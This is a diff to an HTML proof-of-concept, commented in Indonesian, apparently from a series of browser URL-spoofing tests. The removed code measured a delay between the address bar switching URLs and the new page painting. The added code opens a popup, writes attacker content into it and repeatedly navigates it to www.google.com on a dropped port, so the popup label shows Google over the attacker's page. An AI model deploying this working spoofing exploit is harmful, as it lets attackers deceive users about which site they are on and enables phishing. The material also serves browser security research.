@@ -1,22 +1,17 @@
-<!-- 1 | 2026 · JENDELA COMMIT-vs-PAINT — mesin utama batch ini | [1-CLICK]
-     KENAPA VERSI LAMA GAGAL  seluruh keluarga setInterval(location=...) menyerang URL PENDING.
-     Sejak Chrome ~76 omnibox dicat proses-browser dari URL yang sudah COMMIT, dan renderer
-     tidak boleh mendorong pending-URL. Invarian itu sudah ditutup di tingkat arsitektur.
-     SUMBU BARU  omnibox di-update saat COMMIT. Piksel dokumen LAMA tetap di layar sampai
-     dokumen BARU melukis frame pertamanya. Di antara keduanya ada jendela di mana
-     bar sudah menulis URL tujuan sementara layar masih menampilkan halaman penyerang.
-     Bar tidak berbohong - ia jujur tentang dokumen yang belum ada.
-     YANG DIUKUR  berapa MILIDETIK piksel lama bertahan setelah bar berganti. Itu satu angka,
-     dan angka itulah laporannya. >500ms konsisten = jendela yang bisa dipakai.
-     EXPECTED-SECURE  bar tidak berganti sampai dokumen tujuan melukis frame pertama (~0ms).
-     Nol jaringan, deterministik, tidak bergantung port mati / DNS / CDN. -->
-<h2 style="font:20px system-ui">HALAMAN A — ini konten penyerang</h2>
-<p id=r style="font:12px monospace"></p>
-<button onclick="go(3000)">Navigasi ke B (blokir paint 3 detik)</button>
-<button onclick="go(0)">KONTROL: B tanpa blokir</button>
-<p style="font:13px system-ui">Setelah klik: <b>baca address bar</b> — ia sudah menulis <code>2.html</code>.
-Lalu <b>lihat layar</b> — masih halaman A ini. Screenshot saat keduanya benar. Itu predikatnya.</p>
+<!-- UPGRADE M2 -> M1. Koordinat baru: G=popup-ber-window-features x A=dead-port.
+     Korpus punya dead-port di TAB (17-minimal/01) dan popup chromeless TANPA hang (batch20 #13);
+     gabungan "popup yang label-nya sudah kosong, lalu diisi URL PENDING" belum ada file-nya.
+     PREDIKAT: label popup menulis www.google.com sementara dokumennya milik origin penyerang.
+     EXPECTED-SECURE: label tetap kosong/about:blank/origin asli - URL hanya muncul saat COMMIT.
+     Port 82 dipilih karena DI-DROP (timeout); port yang me-RST memicu error-page commit instan = bar jujur lagi.
+     Interval 9800 ms menembak ulang tepat sebelum timeout jaringan ~10 s. Pasangkan dengan 03 sbg baseline. -->
 <script>
-document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
-function go(ms) { sessionStorage.t0 = Date.now(); location.href = '2.html?block=' + ms; }
+var T = 'https://www.google.com:82/';
+function m1(){
+  var w = window.open('', '_blank', 'width=420,height=320');
+  w.document.write('<h2>Dokumen ini milik ' + location.origin + ' &mdash; BUKAN google.com</h2>');
+  w.location = T;                                              // SWAP: label mulai mengecat T (pending)
+  setInterval(function(){ w.location = T; }, 9800);            // HOLD: arm-ulang sebelum timeout
+}
 </script>
+<button onclick="m1()">M1 &mdash; origin PALSU di label popup</button>
